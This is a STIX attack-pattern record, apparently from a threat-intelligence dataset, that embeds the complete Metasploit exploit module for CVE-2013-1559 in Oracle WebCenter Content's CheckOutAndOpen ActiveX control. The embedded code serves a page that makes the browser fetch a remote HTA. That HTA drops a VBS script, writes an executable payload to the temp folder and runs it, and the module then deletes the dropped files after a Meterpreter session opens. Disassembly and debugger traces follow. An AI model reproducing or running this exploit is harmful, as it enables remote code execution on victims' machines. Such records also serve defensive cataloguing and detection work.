{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3efee053-588c-462a-9a7f-e53effb18da1",
    "created": "2024-08-14T16:44:47.452364Z",
    "modified": "2024-08-14T16:44:47.452369Z",
    "name": "\"Oracle WebCenter Content CheckOutAndOpen.dll ActiveX Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in the Oracle WebCenter Content CheckOutAndOpenControl ActiveX. This vulnerability exists in openWebdav(), where user controlled input is used to call ShellExecuteExW(). This module abuses the control to execute an arbitrary HTA from a remote location. This module has been tested successfully with the CheckOutAndOpenControl ActiveX installed with Oracle WebCenter Content 11.1.1.6.0.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/oracle_webcenter_checkoutandopen.rb",
            "external_id": "oracle_webcenter_checkoutandopen.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1559"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpuapr2013-1899555.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Oracle WebCenter Content CheckOutAndOpen.dll ActiveX Remote Code Execution\",\n        'Description' => %q{\n          This module exploits a vulnerability found in the Oracle WebCenter Content\n          CheckOutAndOpenControl ActiveX. This vulnerability exists in openWebdav(), where\n          user controlled input is used to call ShellExecuteExW(). This module abuses the\n          control to execute an arbitrary HTA from a remote location. This module has been\n          tested successfully with the CheckOutAndOpenControl ActiveX installed with Oracle\n          WebCenter Content 11.1.1.6.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2013-1559' ],\n          [ 'OSVDB', '92386' ],\n          [ 'BID', '59122' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpuapr2013-1899555.html' ],\n          [ 'ZDI', '13-094' ]\n        ],\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Automatic', {} ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2013-04-16',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def exploit\n    @var_exename = rand_text_alpha(5 + rand(5)) + \".exe\"\n    @dropped_files = [\n      @var_exename\n    ]\n    super\n  end\n\n  def on_new_session(session)\n    if session.type == \"meterpreter\"\n      session.core.use(\"stdapi\") unless session.ext.aliases.include?(\"stdapi\")\n\n      @dropped_files.delete_if do |file|\n        win_file = file.gsub(\"/\", \"\\\\\\\\\")\n        begin\n          wintemp = session.sys.config.getenv('TEMP')\n          win_file = \"#{wintemp}\\\\#{win_file}\"\n          session.shell_command_token(%Q|attrib.exe -r \"#{win_file}\"|)\n          session.fs.file.rm(win_file)\n          print_good(\"Deleted #{file}\")\n          true\n        rescue ::Rex::Post::Meterpreter::RequestError\n          print_error(\"Failed to delete #{win_file}\")\n          false\n        end\n      end\n    end\n  end\n\n  def build_hta(cli)\n    var_shellobj\t= rand_text_alpha(rand(5) + 5);\n    var_fsobj\t= rand_text_alpha(rand(5) + 5);\n    var_fsobj_file\t= rand_text_alpha(rand(5) + 5);\n    var_vbsname\t= rand_text_alpha(rand(5) + 5);\n    var_writedir\t= rand_text_alpha(rand(5) + 5);\n\n    var_origLoc\t= rand_text_alpha(rand(5) + 5);\n    var_byteArray\t= rand_text_alpha(rand(5) + 5);\n    var_writestream\t= rand_text_alpha(rand(5) + 5);\n    var_strmConv\t= rand_text_alpha(rand(5) + 5);\n\n    p = regenerate_payload(cli);\n    exe = generate_payload_exe({ :code => p.encoded })\n\n    # Doing in this way to bypass the ADODB.Stream restrictions on JS,\n    # even when executing it as an \"HTA\" application\n    # The encoding code has been stolen from ie_unsafe_scripting.rb\n    print_status(\"Encoding payload into vbs/javascript/hta...\");\n\n    # Build the content that will end up in the .vbs file\n    vbs_content\t= Rex::Text.to_hex(%Q|\nDim #{var_origLoc}, s, #{var_byteArray}\n#{var_origLoc} = SetLocale(1033)\n|)\n    # Drop the exe payload into an ansi string (ansi ensured via SetLocale above)\n    # for conversion with ADODB.Stream\n    vbs_ary = []\n    # The output of this loop needs to be as small as possible since it\n    # gets repeated for every byte of the executable, ballooning it by a\n    # factor of about 80k (the current size of the exe template).  In its\n    # current form, it's down to about 4MB on the wire\n    exe.each_byte do |b|\n      vbs_ary << Rex::Text.to_hex(\"s=s&Chr(#{(\"%d\" % b)})\\n\")\n    end\n    vbs_content << vbs_ary.join(\"\")\n\n    # Continue with the rest of the vbs file;\n    # Use ADODB.Stream to convert from an ansi string to it's byteArray equivalent\n    # Then use ADODB.Stream again to write the binary to file.\n    # print_status(\"Finishing vbs...\");\n    vbs_content << Rex::Text.to_hex(%Q|\nDim #{var_strmConv}, #{var_writedir}, #{var_writestream}\n                    #{var_writedir} = WScript.CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\") & \"\\\\#{@var_exename}\"\n\nSet #{var_strmConv} = CreateObject(\"ADODB.Stream\")\n\n#{var_strmConv}.Type = 2\n#{var_strmConv}.Charset = \"x-ansi\"\n#{var_strmConv}.Open\n#{var_strmConv}.WriteText s, 0\n#{var_strmConv}.Position = 0\n#{var_strmConv}.Type = 1\n#{var_strmConv}.SaveToFile #{var_writedir}, 2\n\nSetLocale(#{var_origLoc})|)\n\n    hta = <<-EOS\n      <script>\n      var #{var_shellobj} = new ActiveXObject(\"WScript.Shell\");\n      var #{var_fsobj}    = new ActiveXObject(\"Scripting.FileSystemObject\");\n      var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings(\"%TEMP%\");\n      var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\",2,true);\n\n      #{var_fsobj_file}.Write(unescape(\"#{vbs_content}\"));\n      #{var_fsobj_file}.Close();\n\n      #{var_shellobj}.run(\"wscript.exe \" + #{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\", 1, true);\n      #{var_shellobj}.run(#{var_writedir} + \"\\\\\\\\\" + \"#{@var_exename}\", 0, false);\n      #{var_fsobj}.DeleteFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\");\n      window.close();\n      </script>\n    EOS\n\n    return hta\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n\n    if agent !~ /MSIE \\d/\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Request received for #{request.uri}\");\n\n    if request.uri =~ /\\.hta$/\n      hta = build_hta(cli)\n      print_status(\"Sending HTA application\")\n      send_response(cli, hta, { 'Content-Type' => 'application/hta' })\n      return\n    end\n\n    uri = \"#{get_uri}#{rand_text_alpha(rand(3) + 3)}.hta\"\n\n    html = <<-EOS\n    <html>\n    <body>\n    <object id=\"target\" width=\"100%\" height=\"100%\" classid=\"clsid:A200D7A4-CA91-4165-9885-AB618A39B3F0\"></object>\n    <script>\n      target.openWebdav(\"#{uri}\");\n    </script>\n    </body>\n    </html>\n    EOS\n\n    print_status(\"Sending HTML\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n\n=begin\n\n* The vulnerable control tries to solve how to open the provided extension\n\n.text:100099FC                 lea     eax, [ebp+830h+Src]\n.text:10009A02                 push    eax             ; lpResult\n.text:10009A03                 lea     eax, [ebp+830h+Directory]\n.text:10009A06                 push    eax             ; lpDirectory\n.text:10009A07                 lea     eax, [ebp+830h+PathName]\n.text:10009A0D                 push    eax             ; lpFile\n.text:10009A0E                 call    ds:FindExecutableW ; This function returns the executable associated with the specified file for the default verb\n\n* If succeeds, the provided user data is used as argument:\n\n.text:10009D8F                 lea     eax, [ebp+psz]\n.text:10009D95                 mov     [ebp+pExecInfo.lpFile], eax\n.text:10009D9B                 mov     eax, [ebp+var_238]\n.text:10009DA1                 mov     [ebp+pExecInfo.cbSize], 3Ch\n.text:10009DAB                 mov     [ebp+pExecInfo.fMask], 2000000h\n.text:10009DB5                 mov     [ebp+pExecInfo.hwnd], ebx\n.text:10009DBB                 mov     [ebp+pExecInfo.lpVerb], offset aOpen ; \"open\"\n.text:10009DC5                 jnb     short loc_10009DCD\n.text:10009DC7                 lea     eax, [ebp+var_238]\n.text:10009DCD\n.text:10009DCD loc_10009DCD:                           ; CODE XREF: make_ShellExecute_sub_10009ACC+2F9\u0018j\n.text:10009DCD                 mov     [ebp+pExecInfo.lpParameters], eax\n.text:10009DD3                 lea     eax, [ebp+pExecInfo]\n.text:10009DD9                 push    eax             ; pExecInfo\n.text:10009DDA                 mov     [ebp+pExecInfo.lpDirectory], ebx\n.text:10009DE0                 mov     [ebp+pExecInfo.nShow], 0Ah\n.text:10009DEA                 call    ds:ShellExecuteExW\n\n* On the debugger:\n\nBreakpoint 1 hit\neax=0201ef6c ebx=00000000 ecx=00000000 edx=03850608 esi=00000008 edi=00000000\neip=10009dea esp=0201ee08 ebp=0201f200 iopl=0         nv up ei pl nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212\nCheckOutAndOpen!DllUnregisterServer+0x7108:\n10009dea ff156cd20210    call    dword ptr [CheckOutAndOpen!DllUnregisterServer+0x2a58a (1002d26c)] ds:0023:1002d26c={SHELL32!ShellExecuteExW (7ca02f03)}\n0:007> dd esp\n0201ee08  0201ef6c <== pExecInfo\n0:007> dd 0201ef6c\n0201ef6c  0000003c 02000000 00000000 10031468\n0201ef7c  0201efe0 03854688\n0:007> du 0201efe0\n0201efe0  \"C:\\WINDOWS\\system32\\mshta.exe\"\n0:007> du 03854688\n03854688  \"\"http://192.168.172.1:8080/xKRTv\"\n038546c8  \"m0mqpAt7sEYdVq.hta\"\"\n\nThis code allows to launch other executables with user data provided as argument, but at the moment I like the HTA\nsolution because it allows to pass URL's as arguments. And code executed by mshta is on a privileged zone. Other\nexecutables allow to provide SMB URI's but metasploit only allow to 'simulate' a SMB resource through webdav, so\nthe target should have the WebClient service enabled, which is only enabled by default on XP SP3.\n=end\n",
    "x_mitre_disclosure_date": "2013-04-16",
    "x_mitre_platforms": [
        "win'"
    ]
}